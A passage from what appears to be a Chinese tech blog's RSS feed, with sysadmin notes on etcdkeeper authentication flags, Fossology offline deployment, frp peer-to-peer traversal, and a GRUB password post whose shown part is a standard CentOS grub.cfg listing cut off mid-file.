<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        verify</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> certificates</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TLS-enabled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> secure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> servers</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CA</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bundle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (only </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -cert</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        identify</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> secure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> client</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TLS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> certificate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (only </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -key</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        identify</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> secure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> client</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TLS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> key</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (only </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -auth</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bool</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etcd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> auth</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ETCD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> client</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connect</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>访问测试</h2>
<p><a href="http://YOUR_IP_ADDRESS:8888/etcdkeeper/" target="_blank" rel="noopener noreferrer">http://YOUR_IP_ADDRESS:8888/etcdkeeper/</a></p>
<h2>etcdkeeper访问开启鉴权的etcd</h2>
<p><a href="https://github.com/evildecay/etcdkeeper/issues/57" target="_blank" rel="noopener noreferrer">https://github.com/evildecay/etcdkeeper/issues/57</a></p>
<p>如果etcd集群开启了鉴权。(etcdctl --endpoints=[http://127.0.0.1:2379] auth enable)</p>
<p>那么etcdkeeper启动时需要添加参数-auth true</p>
<p>如果etcd集群开启了鉴权，但是etcdkeeper没有添加参数-auth true，及时输入了正确的用户名和密码，也会出现以下情况：</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>Fossy平台离线部署分析</title>
      <link>https://www.geekery.cn/note-book/Fossology/Fossy%E5%B9%B3%E5%8F%B0%E7%A6%BB%E7%BA%BF%E9%83%A8%E7%BD%B2%E5%88%86%E6%9E%90.html</link>
      <guid>https://www.geekery.cn/note-book/Fossology/Fossy%E5%B9%B3%E5%8F%B0%E7%A6%BB%E7%BA%BF%E9%83%A8%E7%BD%B2%E5%88%86%E6%9E%90.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Fossy平台离线部署分析</source>
      <description>Fossy平台离线部署分析 压缩包上传检测方法 image-20241010154938422 下载报告 经过测试DEP5更直观。 image-20241010155049729 可否离线工作 一些官方未修复bug的解决方法 scancode /root/.cache Permission denied 解决方法 在官方的文件基础上增加环境变量</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>压缩包上传检测方法</h2>
<p></p>
<h2>下载报告</h2>
<p>经过测试DEP5更直观。</p>
<p></p>
<h2>可否离线工作</h2>
<p>| 组件名称                            | 离线工作状态 | 功能描述                                                     | 问题描述                                                    | 备注                                                    |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Frp实现p2p穿透流量不经过公网服务器</title>
      <link>https://www.geekery.cn/note-book/Frp/Frp%E5%AE%9E%E7%8E%B0p2p%E7%A9%BF%E9%80%8F%E6%B5%81%E9%87%8F%E4%B8%8D%E7%BB%8F%E8%BF%87%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Frp/Frp%E5%AE%9E%E7%8E%B0p2p%E7%A9%BF%E9%80%8F%E6%B5%81%E9%87%8F%E4%B8%8D%E7%BB%8F%E8%BF%87%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Frp实现p2p穿透流量不经过公网服务器</source>
      <description>Frp实现p2p穿透流量不经过公网服务器 从公网买服务器的时候经常遇到带宽太小的问题，国内的网络又非常的慢，导致每MB的价格非常的昂贵，搭建frp服务器总会被流量低速卡脖子卡脖子，有一天我看到Frp提供了一个叫Xtcp的传输模式，这种模式可以点对点的传输流量而流量不经过公网服务器，只要两台个人电脑都可以被穿透就可以，这让我非常感兴趣，解决了带宽卡脖子的...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>从公网买服务器的时候经常遇到带宽太小的问题，国内的网络又非常的慢，导致每MB的价格非常的昂贵，搭建frp服务器总会被流量低速卡脖子卡脖子，有一天我看到Frp提供了一个叫Xtcp的传输模式，这种模式可以点对点的传输流量而流量不经过公网服务器，只要两台个人电脑都可以被穿透就可以，这让我非常感兴趣，解决了带宽卡脖子的问题。下面对这种使用xtcp协议实现流量穿透内网的方式进行简单探究。</p>
</blockquote>
<h2>原理解析</h2>
<h3>步骤1 打通两个节点的内网（udp打洞）</h3>
]]></content:encoded>
    </item>
    <item>
      <title>GRUB锁定密码</title>
      <link>https://www.geekery.cn/note-book/GRUB/GRUB%E9%94%81%E5%AE%9A%E5%AF%86%E7%A0%81.html</link>
      <guid>https://www.geekery.cn/note-book/GRUB/GRUB%E9%94%81%E5%AE%9A%E5%AF%86%E7%A0%81.html</guid>
      <source url="https://www.geekery.cn/rss.xml">GRUB锁定密码</source>
      <description>GRUB锁定密码 该方法用于设置一个无法修改的用户密码，即使已经拥有root权限并且已经修改了密码，重启设备密码会自动恢复。 修改如下文件 L79-L88</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>该方法用于设置一个无法修改的用户密码，即使已经拥有root权限并且已经修改了密码，重启设备密码会自动恢复。</p>
</blockquote>
<h2>修改如下文件</h2>
<p>L79-L88</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@ubuntu grub2]# cat grub.cfg</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># DO NOT EDIT THIS FILE</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># It is automatically generated by grub2-mkconfig using templates</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># from /etc/grub.d and settings from /etc/default/grub</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/00_header ###</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pager=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-s</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/grubenv ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  load_env</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">next_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ] ; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default="</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">next_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> next_entry=</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> next_entry</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot_once=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default="</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">saved_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">feature_menuentry_id</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  menuentry_id_option</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"--id"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  menuentry_id_option</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> menuentry_id_option</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prev_saved_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> saved_entry="</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prev_saved_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> saved_entry</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> prev_saved_entry=</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> prev_saved_entry</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot_once=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> savedefault</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-z</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">boot_once</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    saved_entry</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">chosen</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> saved_entry</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  fi</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> load_video</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_all_video_module</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all_video</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> efi_gop</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> efi_uga</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ieee1275_fb</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbe</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> video_bochs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> video_cirrus</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  fi</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">terminal_output</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> console</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_timeout_style</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ] ; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout_style=menu</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Fallback normal timeout code in case the timeout_style feature is</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># unavailable.</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/00_header ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/00_tuned ###</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tuned_params=""</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tuned_initrd=""</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/00_tuned ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/01_users ###</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-f</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prefix</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/user.cfg ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  source</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prefix</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/user.cfg</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">GRUB2_PASSWORD</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> superusers="root"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> superusers</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    password_pbkdf2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">GRUB2_PASSWORD</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  fi</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/01_users ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/10_linux ###</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">menuentry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (5.4.119-19-0006) 7 (Core)'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu-linux</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> os</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --unrestricted</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $menuentry_id_option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'gnulinux-5.4.119-19-0006-advanced-a96bb1f6-5e36-4743-8e86-8d3810f5ba85'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	load_video</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gfxpayload=keep</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gzio</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part_msdos</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext2</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root='hd0,msdos2'</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_platform_search_hint</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
